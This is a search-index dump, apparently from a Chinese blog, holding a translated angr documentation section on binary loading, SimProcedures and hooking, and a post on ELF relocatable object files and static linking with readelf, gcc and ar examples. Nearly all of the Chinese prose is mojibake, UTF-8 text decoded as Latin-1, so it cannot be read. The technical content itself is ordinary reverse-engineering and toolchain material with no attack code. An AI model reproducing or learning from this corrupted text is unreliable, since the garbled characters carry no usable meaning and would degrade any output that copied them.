è½½å™¨ï¼Œä»¥PyELFToolsä¸ºåŸºç¡€ å¦ pe PEé™æ€åŠ è½½å™¨ï¼Œä»¥PEFileä¸ºåŸºç¡€ å¦ mach-o Mach-oé™æ€åŠ è½½å™¨ï¼Œä¸æ”¯æŒåŠ¨æ€é“¾æ¥å’Œå˜åŸº å¦ cgc Cyber Grand Challengeé™æ€åŠ è½½å™¨ å¦ backedgcc CGCäºŒè¿›åˆ¶æ–‡ä»¶é™æ€åŠ è½½å™¨ï¼Œå…è®¸æŒ‡å®šå†…å­˜å’Œæ³¨å†Œbackers å¦ elfcore ELF core dumpæ–‡ä»¶é™æ€åŠ è½½å™¨ å¦ blob ä½œä¸ºå¹³å¦é•œåƒåŠ è½½æ–‡ä»¶ æ˜¯ ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:4:3","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸‰ï¼‰Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"ç¬¦å·å‡½æ•°ç®€ä»‹ï¼ˆSymbolic Function Summariesï¼‰ é»˜è®¤æƒ…å†µä¸‹ï¼ŒProjectå°è¯•ä½¿ç”¨SimProceduresæ›¿æ¢åº“å‡½æ•°çš„å¤–éƒ¨è°ƒç”¨ï¼ŒSimProcedureså®é™…ä¸Šåªæ˜¯æ¨¡ä»¿åº“å‡½æ•°æ”¹å˜è¿è¡ŒçŠ¶æ€çš„å‡½æ•°ã€‚æˆ‘ä»¬å·²ç»å®ç°äº†è®¸å¤šå‡½æ•°ä½œä¸ºSimProceduresã€‚è¿™äº›å†…ç½®ç¨‹åºå¯ä»¥é€šè¿‡angr.SIM_PROCEDURESå­—å…¸è®¿é—®åˆ°ã€‚è¿™ä¸ªå­—å…¸æ˜¯ä¸¤çº§çš„ï¼Œé¦–å…ˆæŒ‡å®šåŒ…åç§°ï¼ˆå¦‚libcã€posixã€win32ã€stubsï¼‰å†æŒ‡å®šåº“å‡½æ•°åã€‚ä½¿ç”¨SimProcedureæ¥æ›¿ä»£å®é™…ç³»ç»Ÿä¸­çš„åº“å‡½æ•°å¯ä»¥ä½¿åˆ†æå˜å¾—æ›´å®¹æ˜“ï¼Œä½†ä¹Ÿä¼šå¢åŠ ä¸€äº›æ½œåœ¨çš„ä¸ç¡®å®šæ€§ã€‚ å¦‚æœç»™å®šçš„å‡½æ•°æ²¡æœ‰å¯¹åº”çš„SimProcedureï¼š å¦‚æœauto_load_libs=Trueï¼ˆè¿™æ˜¯é»˜è®¤å€¼ï¼‰ï¼Œé‚£ä¹ˆçœŸæ­£çš„åº“å‡½æ•°å°†ä¼šè¢«æ‰§è¡Œã€‚è¿™ä¸ä¸€å®šæ˜¯ä¸æ˜¯ä½ æƒ³è¦çš„ï¼Œå…·ä½“å–å†³äºå®é™…åŠŸèƒ½ã€‚libcä¸­çš„ä¸€äº›å‡½æ•°åˆ†æèµ·æ¥å¯èƒ½ååˆ†å¤æ‚ï¼Œå¯èƒ½ä¼šå¯¼è‡´å°è¯•æ‰§è¡Œå®ƒä»¬çš„è·¯å¾„æ•°æ¿€å¢ã€‚ å¦‚æœauto_load_libs=Falseï¼ŒProjectä¼šå°†å®ƒä»¬è§£ææˆReturnUnconstrainedçš„SimProcedureï¼Œæ¯æ¬¡è°ƒç”¨å®ƒéƒ½ä¼šè¿”å›ä¸€ä¸ªå”¯ä¸€çš„æ— çº¦æŸç¬¦å·å€¼ å¦‚æœuse_sim_procedures=Flaseï¼ˆè¿™æ˜¯angr.Projectçš„å‚æ•°ï¼Œè€Œä¸æ˜¯cle.Loaderçš„å‚æ•°ï¼Œé»˜è®¤æ˜¯Falseï¼‰ï¼Œé‚£ä¹ˆåªæœ‰å¤–éƒ¨å¯¹è±¡æä¾›çš„ç¬¦å·ä¼šè¢«SimProceduresæ›¿æ¢ï¼Œå¹¶ä¸”å°†è¢«æ›¿æ¢ä¸ºReturnUnconstrainedï¼Œåªè¿”å›ä¸€ä¸ªç¬¦å·å€¼è€Œä¸åšå…¶ä»–çš„äº‹ã€‚ ä½ å¯ä»¥æŒ‡å®šè¦æ’é™¤çš„ç¬¦å·ï¼Œä½¿å…¶ä¸è¢«SimProceduresæ›¿æ¢ã€‚ä½¿ç”¨angr.Project: exclude_sim_procedures_listå’Œexclude_sim_procedures_func å¯ä»¥æŸ¥çœ‹angr.Project._register_objectçš„ä»£ç æ¥äº†è§£ç¡®åˆ‡çš„ç®—æ³• ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:5:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸‰ï¼‰Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"Hooking angrå¯ä»¥å°†åº“ä»£ç æ›¿æ¢ä¸ºpythonçš„æ¨¡æ‹Ÿï¼Œè¿™ç§æœºåˆ¶ç§°ä¸ºhookingï¼Œä½ ä¹Ÿå¯ä»¥è¿™ä¹ˆåšï¼ åœ¨è¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œæ—¶ï¼Œangråœ¨æ¯ä¸€æ­¥éƒ½ä¼šæ£€æŸ¥æ˜¯å¦æœ‰å¯¹åº”çš„hookå‡½æ•°ï¼Œå¦‚æœæœ‰ï¼Œåˆ™è¿è¡Œhookå‡½æ•°å†…å®¹è€Œä¸æ˜¯äºŒè¿›åˆ¶ä»£ç ã€‚å¯ä»¥ä½¿ç”¨APIproj.hookï¼ˆaddr, hookï¼‰ï¼Œå…¶ä¸­hookæ˜¯ä¸€ä¸ªSimProcedureå®ä¾‹ã€‚ä½ å¯ä»¥é€šè¿‡.is_hooked``.unhook``.hooked_byæ¥ç®¡ç†å·¥ç¨‹ä¸­çš„hooksã€‚ å¦ä¸€ä¸ªhookå‡½æ•°çš„æ›¿ä»£APIï¼Œä½¿ç”¨proj.hook(addr)ä½œä¸ºå‡½æ•°è£…é¥°å™¨ï¼Œä½ å¯ä»¥å°†ç°æˆçš„å‡½æ•°ä½œä¸ºhookå‡½æ•°ã€‚å¦‚æœä½ è¿™ä¹ˆåšï¼Œä½ å¯ä»¥é€‰æ‹©æ˜¯å¦æŒ‡å®šä¸€ä¸ªlengthå…³é”®å­—ï¼Œåœ¨hookå‡½æ•°å®Œæˆåè·³è¿‡æŒ‡å®šé•¿åº¦çš„å­—èŠ‚ç»§ç»­æ‰§è¡Œã€‚ \u003e\u003e\u003e stub_func = angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'] # è¿™æ˜¯ä¸€ä¸ªç±» \u003e\u003e\u003e proj.hook(0x10000, stub_func()) # ä½¿ç”¨ç±»çš„å®ä¾‹è¿›è¡Œhook \u003e\u003e\u003e proj.is_hooked(0x10000) True \u003e\u003e\u003e proj.hooked_by(0x10000) \u003cReturnUnconstrained\u003e \u003e\u003e\u003e proj.unhook(0x10000) \u003e\u003e\u003e @proj.hook(0x20000, length=5) ... def my_hook(state): ... state.regs.rax = 1 \u003e\u003e\u003e proj.is_hooked(0x20000) True æ­¤å¤–ï¼Œä½ å¯ä»¥ä½¿ç”¨proj.hook_symbol(name, hook)ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç¬¦å·çš„åç§°ï¼Œæ¥hookç¬¦å·æ‰€åœ¨çš„åœ°å€ã€‚ä¸€ä¸ªéå¸¸é‡è¦çš„ç”¨é€”æ˜¯æ‰©å±•angrçš„å†…ç½®SimProceduresåº“ã€‚å› ä¸ºè¿™äº›åº“å‡½æ•°éƒ½æ˜¯ç±»ï¼Œæ‰€ä»¥ä½ å¯ä»¥åˆ›å»ºå®ƒä»¬çš„å­ç±»ï¼Œé‡è½½å®ƒä»¬çš„ä¸€äº›è¡Œä¸ºï¼Œç„¶ååœ¨hookä¸­ä½¿ç”¨ä½ çš„å­ç±»ã€‚ ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:5:1","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸‰ï¼‰Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"åˆ°è¿™é‡Œéå¸¸æ£’ï¼ï¼ˆSo far so good ï¼ï¼‰ åˆ°ç›®å‰ä¸ºæ­¢ï¼Œä½ åº”è¯¥å¯¹CLEåŠ è½½ç¨‹åºå’ŒProjectçº§åˆ«æ§åˆ¶åˆ†æçš„ç¯å¢ƒæœ‰ä¸€ä¸ªå¤§è‡´çš„äº†è§£ã€‚ä½ è¿˜åº”è¯¥æ˜ç™½angrå¯¹ä½¿ç”¨SimProcedureså°†å¤æ‚çš„åº“å‡½æ•°hookåšå‡ºäº†åˆç†çš„å°è¯•æ¥ç®€åŒ–åˆ†æã€‚ è¦äº†è§£æ‚¨å¯ä»¥ä½¿ç”¨CLEåŠ è½½ç¨‹åºåŠåç«¯å¯æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œï¼Œè¯·æŸ¥çœ‹CLE API docs ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:6:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸‰ï¼‰Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Binary"],"content":"Cæºä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶ å›é¡¾ä¸€ä¸‹ä»æºä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„åŸºæœ¬è¿‡ç¨‹ ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:1:0","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"é¢„å¤„ç†ï¼ˆpre-processor) ä½œç”¨ï¼šåˆ é™¤æ³¨é‡Šã€æ–‡ä»¶åŒ…å«ã€æ–‡æœ¬æ›¿æ¢ã€å±•å¼€å®å®šä¹‰ç­‰ å‘½ä»¤ï¼šcppã€gcc -E main.c â€“\u003e main.i ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:1:1","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"ç¼–è¯‘ï¼ˆcompilerï¼‰ ä½œç”¨ï¼šå°†Cæºä»£ç ç¼–è¯‘æˆæ±‡ç¼–ä»£ç  å‘½ä»¤ï¼šcc -Sã€gcc -S main.i â€“\u003e main.s ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:1:2","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"æ±‡ç¼–ï¼ˆassemblerï¼‰ ä½œç”¨ï¼šå°†æ±‡ç¼–ä»£ç è½¬åŒ–æˆå¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶ å‘½ä»¤ï¼šasã€gcc -cï¼ˆç¼–è¯‘å¹¶æ±‡ç¼–ï¼‰ main.c â€“\u003e main.o ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:1:3","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"é“¾æ¥ï¼ˆlinkerï¼‰ ä½œç”¨ï¼šç»„åˆå¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶ï¼Œæ„é€ å¯æ‰§è¡Œæ–‡ä»¶ å‘½ä»¤ï¼šld â€“staticï¼ˆéœ€æ‰‹åŠ¨åŠ ä¸€å †é™æ€åº“ï¼‰ main.o â€“\u003e main ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:1:4","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼ˆRelocatable Object Filesï¼‰ å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶æ˜¯ä¸€ç§ELFï¼ˆExecutable and Linkable Formatï¼‰æ–‡ä»¶ï¼Œç”±æ±‡ç¼–è¿™ä¸€æ­¥äº§ç”Ÿã€‚åœ¨é“¾æ¥è¿‡ç¨‹ä¸­ï¼Œå¤šä¸ªå¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶è¢«è¿æ¥å™¨ä»¥æŸä¸€ç§æ–¹å¼ç»„åˆï¼Œå½¢æˆæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ ä¸€ä¸ªå¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶å¤§è‡´åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ† ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:2:0","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"ELFå¤´ï¼ˆELF Headerï¼‰ â¯ readelf -h main.o ELF å¤´ï¼š Magicï¼š 7f 45 4c 46 02 01 01 00 01 00 00 00 00 00 00 00 ç±»åˆ«: ELF64 æ•°æ®: 2 è¡¥ç ï¼Œå°ç«¯åº (little endian) Version: 1 (current) OS/ABI: UNIX - System V ABI ç‰ˆæœ¬: 1 ç±»å‹: REL (å¯é‡å®šä½æ–‡ä»¶) ç³»ç»Ÿæ¶æ„: Advanced Micro Devices X86-64 ç‰ˆæœ¬: 0x1 å…¥å£ç‚¹åœ°å€ï¼š 0x0 ç¨‹åºå¤´èµ·ç‚¹ï¼š 0 (bytes into file) Start of section headers: 808 (bytes into file) æ ‡å¿—ï¼š 0x0 Size of this header: 64 (bytes) Size of program headers: 0 (bytes) Number of program headers: 0 Size of section headers: 64 (bytes) Number of section headers: 14 Section header string table index: 13 ELF headerå‰16ä¸ªå­—èŠ‚ä¸­ï¼Œå‰å››ä¸ªå­—èŠ‚ä¸ºé­”æ•°ï¼Œç¬¬5ä¸ªå­—èŠ‚ä¸ºæ–‡ä»¶ç±»å‹ï¼ˆ0x1-\u003e32ä½ï¼Œ0x2-\u003e64ä½ï¼‰ï¼Œç¬¬6ä¸ªå­—èŠ‚ä¸ºå­—èŠ‚åºï¼ˆ0x1-\u003eå°ç«¯åºï¼Œ0x2-\u003eå¤§ç«¯åºï¼‰ï¼Œç¬¬7ä¸ªå­—èŠ‚ä¸ºELFç‰ˆæœ¬å·ï¼Œé€šå¸¸éƒ½ä¸º1ï¼Œå9ä¸ªå­—èŠ‚æœªå®šä¹‰ï¼Œç”¨0å¡«å…… ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:2:1","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"ELF èŠ‚ï¼ˆELF sectionï¼‰ â¯ readelf -S ./main.o # æŸ¥çœ‹sevtion table There are 14 section headers, starting at offset 0x328: èŠ‚å¤´ï¼š [å·] åç§° ç±»å‹ åœ°å€ åç§»é‡ å¤§å° å…¨ä½“å¤§å° æ——æ ‡ é“¾æ¥ ä¿¡æ¯ å¯¹é½ [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .text PROGBITS 0000000000000000 00000040 0000000000000064 0000000000000000 AX 0 0 1 [ 2] .rela.text RELA 0000000000000000 00000220 0000000000000060 0000000000000018 I 11 1 8 [ 3] .data PROGBITS 0000000000000000 000000a4 0000000000000004 0000000000000000 WA 0 0 4 [ 4] .bss NOBITS 0000000000000000 000000a8 0000000000000000 0000000000000000 WA 0 0 1 [ 5] .rodata PROGBITS 0000000000000000 000000a8 0000000000000003 0000000000000000 A 0 0 1 [ 6] .comment PROGBITS 0000000000000000 000000ab 0000000000000013 0000000000000001 MS 0 0 1 [ 7] .note.GNU-stack PROGBITS 0000000000000000 000000be 0000000000000000 0000000000000000 0 0 1 [ 8] .note.gnu.pr[...] NOTE 0000000000000000 000000c0 0000000000000030 0000000000000000 A 0 0 8 [ 9] .eh_frame PROGBITS 0000000000000000 000000f0 0000000000000058 0000000000000000 A 0 0 8 [10] .rela.eh_frame RELA 0000000000000000 00000280 0000000000000030 0000000000000018 I 11 9 8 [11] .symtab SYMTAB 0000000000000000 00000148 00000000000000c0 0000000000000018 12 4 8 [12] .strtab STRTAB 0000000000000000 00000208 0000000000000015 0000000000000000 0 0 1 [13] .shstrtab STRTAB 0000000000000000 000002b0 0000000000000074 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), D (mbind), l (large), p (processor specific) .textï¼šå­˜æ”¾ç¼–è¯‘å¥½çš„æœºå™¨æŒ‡ä»¤ .dataï¼šå­˜æ”¾å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ .bssï¼šæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡å’Œè¢«åˆå§‹åŒ–ä¸º0çš„å…¨å±€å’Œé™æ€å˜é‡ï¼Œä»…åœ¨section tableä¸­æ ‡è®°å ç”¨æ€»ç©ºé—´ï¼Œä¸å æ®å®é™…ç©ºé—´ï¼Œç¨‹åºè¿è¡Œæ—¶è‡ªåŠ¨åœ¨å†…å­˜ä¸­åˆ†é…è¿™äº›å˜é‡ï¼Œå¹¶èµ‹0 .rodataï¼šå­˜æ”¾åªè¯»æ•°æ® .commentï¼šå­˜æ”¾ç¼–è¯‘å™¨ç‰ˆæœ¬ä¿¡æ¯ .symtabï¼šSymbol Table ç¬¦å·è¡¨ .rel.textï¼šRelocation Table é‡å®šä½è¡¨ .debugï¼šè°ƒè¯•ä¿¡æ¯ .lineï¼šåŸå§‹Cç¨‹åºä¸­çš„è¡Œå·å’Œ.text sectionä¸­æœºå™¨æŒ‡ä»¤ä¹‹é—´çš„æ˜ å°„ .strtabï¼šString Table å­—ç¬¦ä¸²è¡¨ï¼Œä¸.symtabç›¸æ¯”ä¸»è¦ç”¨äºè°ƒè¯•æ—¶è€Œä¸æ˜¯è¿è¡Œ .shstrtabï¼šsection headerçš„å­—ç¬¦ä¸²è¡¨ .eh_frameï¼šgccå¤„ç†å¼‚å¸¸æ—¶å…³äºæ ˆå±•å¼€çš„è®°å½•ï¼Œå‚è€ƒé˜…è¯» ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:2:2","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"é™æ€é“¾æ¥ ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:0","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"é™æ€åº“æ–‡ä»¶ ä¸€èˆ¬åç¼€ä¸º.aï¼Œä¸€ç§ç§°ä¸ºarchiveçš„ç‰¹æ®Šæ–‡ä»¶æ ¼å¼ï¼ˆç±»ä¼¼å‹ç¼©åŒ…ï¼‰ï¼Œæ˜¯ä¸€ç»„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„é›†åˆï¼Œå¦‚libc.aã€‚å¯ä½¿ç”¨arå‘½ä»¤è§£å‹æ‰€æœ‰çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åˆ°å½“å‰ç›®å½• ar -x /usr/lib/libc.a ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:1","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"æ‰‹åŠ¨æ„å»ºé™æ€åº“ # ä½¿ç”¨gccåªç¼–è¯‘æ±‡ç¼–ä¸é“¾æ¥ gcc -c main.c -o main.o # ä½¿ç”¨aræ‰“åŒ…æˆarchiveæ–‡ä»¶ï¼Œå¯æŒ‡å®šå¤šä¸ª.oæ–‡ä»¶ï¼ˆå¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶ï¼‰ ar rcs libmain.a main.o ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:2","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"ä½¿ç”¨æŒ‡å®šé™æ€åº“é“¾æ¥ # ä½¿ç”¨gccé™æ€é“¾æ¥ä½¿ç”¨æŒ‡å®šé™æ€åº“ï¼Œåå¯è·Ÿå¤šä¸ªï¼Œé»˜è®¤æ·»åŠ libc.a gcc --static -o main main.o ./libmain.a ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:3","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"ç¬¦å·è§£æ é“¾æ¥å™¨åœ¨é“¾æ¥è¿‡ç¨‹ä¸­ç»´æŠ¤äº†ä¸‰ä¸ªé›†åˆï¼šEã€Uã€Dï¼Œåˆ†åˆ«æ˜¯æœ€ç»ˆä½¿ç”¨çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ã€å¼•ç”¨äº†ä½†å°šæœªå®šä¹‰çš„ç¬¦å·ã€å·²å®šä¹‰çš„ç¬¦å·ï¼Œä¸‰ä¸ªé›†åˆåˆå§‹å‡ä¸ºç©ºã€‚ é“¾æ¥å¼€å§‹ï¼Œé“¾æ¥å™¨ä»å·¦è‡³å³æ‰«æå‘½ä»¤è¡Œå‚æ•°ï¼Œå‘ç°å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼Œå°±æ”¾å…¥é›†åˆEï¼Œå°†å·²å®šä¹‰çš„ç¬¦å·åŠ å…¥Dä¸­ï¼Œå°†ä¸ºå®šä¹‰çš„ç¬¦å·åŠ å…¥Uä¸­ã€‚ å‘ç°é™æ€åº“æ–‡ä»¶ï¼Œå°±å°è¯•å¯¹åº“ä¸­æ¯ä¸€ä¸ªå¯é‡å®šå‘ç›®æ 